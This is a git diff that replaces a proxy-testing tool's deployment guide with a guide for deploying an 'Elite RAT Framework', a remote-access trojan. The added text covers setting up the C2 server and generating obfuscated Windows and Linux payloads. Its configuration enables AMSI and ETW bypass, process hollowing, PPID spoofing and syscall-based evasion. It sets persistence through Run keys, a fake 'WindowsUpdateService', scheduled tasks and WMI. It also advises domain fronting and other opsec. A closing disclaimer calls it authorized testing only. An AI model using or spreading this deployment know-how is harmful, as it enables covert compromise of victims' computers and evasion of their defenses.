@@ -1,286 +1,275 @@
-# ProxyAssessmentTool - Production Deployment Guide
+# 🚀 Elite RAT Framework - Deployment Guide
 
-## 🚀 Quick Start (Development)
+## Prerequisites
 
+### System Requirements
+- **OS**: Windows 10/11, Server 2016+ | Linux (Ubuntu 20.04+, Debian 10+)
+- **Python**: 3.8 or higher
+- **Memory**: Minimum 4GB RAM
+- **Disk**: 500MB free space
+- **Network**: Outbound HTTPS (443) or configurable port
+
+### Required Dependencies
 ```bash
-# Clone the repository
-git clone https://github.com/oranolio956/flipperflipper.git
-cd flipperflipper
-
-# Install Python dependencies
-cd backend
 pip install -r requirements.txt
-
-# Run the backend
-python proxy_tester.py
-
-# Open frontend/index.html in your browser
 ```
 
-## 🐳 Production Deployment with Docker
+Key packages:
+- Flask & Flask-SocketIO (Web interface)
+- cryptography (Encryption)
+- psutil (System operations)
+- pyinstaller (Payload generation)
 
-### 1. Prerequisites
-- Docker and Docker Compose installed
-- Domain name (for HTTPS)
-- Server with at least 2GB RAM
+## Installation
 
-### 2. Deploy with Docker Compose
-
+### 1. Clone Repository
 ```bash
-# Clone the repository
-git clone https://github.com/oranolio956/flipperflipper.git
-cd flipperflipper/backend
-
-# Create .env file
-cat > .env << EOF
-DB_PASSWORD=your_secure_password
-GRAFANA_PASSWORD=your_grafana_password
-API_DOMAIN=your-domain.com
-EOF
-
-# Start all services
-docker-compose up -d
-
-# Check logs
-docker-compose logs -f backend
+git clone https://github.com/yourusername/elite-rat.git
+cd elite-rat
 ```
 
-### 3. Access Services
-- **API**: http://localhost:8000
-- **Frontend**: http://localhost:80
-- **Grafana**: http://localhost:3000 (admin/your_password)
-- **Prometheus**: http://localhost:9090
-
-## ☁️ Cloud Deployment Options
-
-### AWS EC2 Deployment
-
+### 2. Install Dependencies
 ```bash
-# 1. Launch EC2 instance (Ubuntu 22.04, t3.medium or larger)
-
-# 2. SSH into instance
-ssh -i your-key.pem ubuntu@your-ec2-ip
-
-# 3. Install Docker
-curl -fsSL https://get.docker.com -o get-docker.sh
-sudo sh get-docker.sh
-sudo usermod -aG docker ubuntu
-
-# 4. Install Docker Compose
-sudo apt-get update
-sudo apt-get install docker-compose-plugin
-
-# 5. Clone and deploy
-git clone https://github.com/oranolio956/flipperflipper.git
-cd flipperflipper/backend
-sudo docker compose up -d
+pip install -r requirements.txt
 ```
 
-### DigitalOcean Deployment
+### 3. Configure Environment
 
+Create `.env` file:
 ```bash
-# 1. Create Droplet (Ubuntu 22.04, 2GB RAM minimum)
-
-# 2. SSH into droplet
-ssh root@your-droplet-ip
-
-# 3. Run setup script
-curl -fsSL https://raw.githubusercontent.com/oranolio956/flipperflipper/main/setup.sh | bash
-```
-
-### Google Cloud Run Deployment
-
-```bash
-# 1. Build and push image
-gcloud builds submit --tag gcr.io/YOUR_PROJECT/proxy-tester
-
-# 2. Deploy to Cloud Run
-gcloud run deploy proxy-tester \
-  --image gcr.io/YOUR_PROJECT/proxy-tester \
-  --platform managed \
-  --allow-unauthenticated \
-  --port 8000 \
-  --memory 2Gi
-```
-
-## 🔧 Configuration
-
-### Backend Configuration
-Edit `backend/config.py`:
-
-```python
-# API Settings
-API_HOST = "0.0.0.0"
-API_PORT = 8000
-
-# Redis Settings
-REDIS_URL = "redis://localhost:6379"
-
-# Database Settings
-DATABASE_URL = "postgresql+asyncpg://user:pass@localhost/proxydb"
+# C2 Configuration
+ELITE_C2_HOST=your.domain.com
+ELITE_C2_PORT=443
+ELITE_C2_PROTOCOL=https
 
 # Security
-SECRET_KEY = "your-secret-key"
-CORS_ORIGINS = ["https://your-domain.com"]
+ELITE_ENCRYPTION_KEY=<generate-with-openssl-rand-hex-32>
+STITCH_ADMIN_USER=admin
+STITCH_ADMIN_PASSWORD=<strong-password>
+
+# Optional
+ELITE_BEACON_INTERVAL=60
+ELITE_ENABLE_EVASION=true
+STITCH_ENABLE_HTTPS=true
 ```
 
-### Frontend Configuration
-Edit `frontend/index.html`:
-
-```javascript
-const API_URL = 'https://api.your-domain.com';
-```
-
-## 🔒 SSL/HTTPS Setup
-
-### Using Let's Encrypt
-
+### 4. Generate SSL Certificates (for HTTPS)
 ```bash
-# Install Certbot
-sudo apt-get update
-sudo apt-get install certbot python3-certbot-nginx
-
-# Get certificate
-sudo certbot --nginx -d your-domain.com -d api.your-domain.com
-
-# Auto-renewal
-sudo certbot renew --dry-run
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 ```
 
-### Nginx Configuration
+## Starting the C2 Server
 
-Create `/etc/nginx/sites-available/proxy-tester`:
+### Development Mode
+```bash
+python web_app_real.py
+```
 
+### Production Mode
+```bash
+# With Gunicorn
+gunicorn -w 4 -b 0.0.0.0:5000 --certfile=cert.pem --keyfile=key.pem web_app_real:app
+
+# With systemd service
+sudo systemctl start elite-rat
+```
+
+### Docker Deployment
+```dockerfile
+FROM python:3.9-slim
+WORKDIR /app
+COPY requirements.txt .
+RUN pip install -r requirements.txt
+COPY . .
+EXPOSE 5000
+CMD ["python", "web_app_real.py"]
+```
+
+## Payload Generation
+
+### Windows Executable
+```bash
+python create_payload.py --target windows --host your.domain.com --port 443
+```
+
+### Linux Binary
+```bash
+python create_payload.py --target linux --host your.domain.com --port 443
+```
+
+### Options
+- `--obfuscate`: Enable code obfuscation
+- `--encrypt`: Encrypt payload
+- `--icon <path>`: Custom icon (Windows)
+- `--persistence`: Include persistence
+
+## Security Configuration
+
+### 1. Enable All Evasion Features
+Edit `Core/config.py`:
+```python
+"evasion": {
+    "process_injection": True,
+    "process_hollowing": True,
+    "ppid_spoofing": True,
+    "etw_bypass": True,
+    "amsi_bypass": True,
+    "dll_unhooking": True,
+    "direct_syscalls": True,
+    "sleep_mask": True
+}
+```
+
+### 2. Configure Persistence Methods
+```python
+"persistence": {
+    "registry_key": r"Software\Microsoft\Windows\CurrentVersion\Run",
+    "service_name": "WindowsUpdateService",
+    "scheduled_task": "SystemMaintenance",
+    "wmi_subscription": True
+}
+```
+
+### 3. Set Operation Parameters
+```python
+"operation": {
+    "beacon_interval": 60,
+    "jitter": 20,
+    "working_hours_only": True,
+    "working_hours_start": 9,
+    "working_hours_end": 17,
+    "kill_date": "2025-12-31"
+}
+```
+
+## Network Configuration
+
+### Firewall Rules
+```bash
+# Allow inbound C2
+sudo ufw allow 5000/tcp
+
+# For reverse proxy
+sudo ufw allow 443/tcp
+```
+
+### Nginx Reverse Proxy
 ```nginx
 server {
-    listen 80;
-    server_name your-domain.com;
-    return 301 https://$server_name$request_uri;
-}
-
-server {
-    listen 443 ssl http2;
-    server_name your-domain.com;
+    listen 443 ssl;
+    server_name your.domain.com;
     
-    ssl_certificate /etc/letsencrypt/live/your-domain.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;
+    ssl_certificate /path/to/cert.pem;
+    ssl_certificate_key /path/to/key.pem;
     
     location / {
-        root /var/www/proxy-tester;
-        try_files $uri $uri/ /index.html;
-    }
-}
-
-server {
-    listen 443 ssl http2;
-    server_name api.your-domain.com;
-    
-    ssl_certificate /etc/letsencrypt/live/api.your-domain.com/fullchain.pem;
-    ssl_certificate_key /etc/letsencrypt/live/api.your-domain.com/privkey.pem;
-    
-    location / {
-        proxy_pass http://localhost:8000;
+        proxy_pass http://127.0.0.1:5000;
         proxy_http_version 1.1;
         proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection 'upgrade';
+        proxy_set_header Connection "upgrade";
         proxy_set_header Host $host;
-        proxy_cache_bypass $http_upgrade;
-    }
-    
-    location /ws {
-        proxy_pass http://localhost:8000;
-        proxy_http_version 1.1;
-        proxy_set_header Upgrade $http_upgrade;
-        proxy_set_header Connection "Upgrade";
-        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto $scheme;
     }
 }
 ```
 
-## 📊 Monitoring & Maintenance
+### Domain Fronting (CDN)
+Configure with Cloudflare/AWS CloudFront for additional obfuscation.
 
-### Health Checks
+## Operational Security
+
+### Do's
+- ✅ Always use HTTPS
+- ✅ Rotate encryption keys regularly
+- ✅ Use unique service names
+- ✅ Enable all evasion features
+- ✅ Test in isolated environment first
+- ✅ Monitor for detection
+- ✅ Use domain fronting when possible
+
+### Don'ts
+- ❌ Never use default credentials
+- ❌ Don't expose C2 directly to internet
+- ❌ Don't reuse infrastructure
+- ❌ Don't run without authorization
+- ❌ Don't ignore operational security
+- ❌ Don't leave default configurations
+
+## Monitoring & Logs
+
+### View Logs
 ```bash
-# Check API health
-curl https://api.your-domain.com/health
-
-# Check Docker containers
-docker ps
-docker-compose logs -f backend
-
-# Check system resources
-htop
-docker stats
+tail -f logs/elite-rat.log
 ```
 
-### Backup Database
-```bash
-# Backup PostgreSQL
-docker-compose exec postgres pg_dump -U proxyuser proxydb > backup.sql
+### Log Levels
+- DEBUG: All operations
+- INFO: Normal operations
+- WARNING: Potential issues
+- ERROR: Operation failures
+- CRITICAL: System failures
 
-# Restore
-docker-compose exec -T postgres psql -U proxyuser proxydb < backup.sql
-```
+### Metrics Dashboard
+Access at: `https://your.c2.server/metrics`
 
-### Update Application
+## Troubleshooting
+
+### Connection Issues
+1. Check firewall rules
+2. Verify SSL certificates
+3. Confirm network connectivity
+4. Check proxy configuration
+
+### Payload Issues
+1. Verify target architecture
+2. Check AV exclusions
+3. Confirm C2 address
+4. Test with verbose logging
+
+### Performance Issues
+1. Increase worker threads
+2. Enable caching
+3. Optimize database queries
+4. Use CDN for static assets
+
+## Updates & Maintenance
+
+### Update Framework
 ```bash
-# Pull latest changes
 git pull origin main
-
-# Rebuild and restart
-docker-compose build
-docker-compose up -d
+pip install -r requirements.txt --upgrade
 ```
 
-## 🚨 Troubleshooting
-
-### Common Issues
-
-1. **WebSocket Connection Failed**
-   - Check CORS settings
-   - Ensure nginx is configured for WebSocket
-   - Check firewall rules
-
-2. **Slow Performance**
-   - Increase worker count in Dockerfile
-   - Add more Redis memory
-   - Use connection pooling
-
-3. **GeoIP Not Working**
-   - Download fresh GeoIP database
-   - Check file permissions
-
-### Debug Mode
+### Backup Configuration
 ```bash
-# Run backend in debug mode
-docker-compose run --rm backend python proxy_tester.py --debug
-
-# Check logs
-docker-compose logs -f backend | grep ERROR
+cp Core/config.py Core/config.py.backup
+cp .env .env.backup
 ```
 
-## 🎯 Production Best Practices
+### Database Maintenance
+```bash
+python manage_db.py --vacuum
+python manage_db.py --backup
+```
 
-1. **Security**
-   - Use strong passwords
-   - Enable firewall (ufw)
-   - Regular security updates
-   - Use fail2ban for SSH
+## Legal Notice
 
-2. **Performance**
-   - Enable Redis persistence
-   - Use CDN for frontend
-   - Implement rate limiting
-   - Monitor resource usage
+⚠️ **WARNING**: This framework is for authorized security testing only.
 
-3. **Reliability**
-   - Set up health checks
-   - Configure auto-restart
-   - Use monitoring (Grafana)
-   - Regular backups
+- Only deploy with explicit written authorization
+- Follow all applicable laws and regulations
+- Maintain detailed audit logs
+- Report findings responsibly
+- Never use for unauthorized access
 
-## 📞 Support
+## Support
 
-For issues or questions:
-- GitHub Issues: https://github.com/oranolio956/flipperflipper/issues
-- Documentation: https://docs.your-domain.com
+- Documentation: `/docs`
+- Issues: GitHub Issues
+- Wiki: GitHub Wiki
+
+---
+
+**Remember**: With great power comes great responsibility. Use ethically and legally.
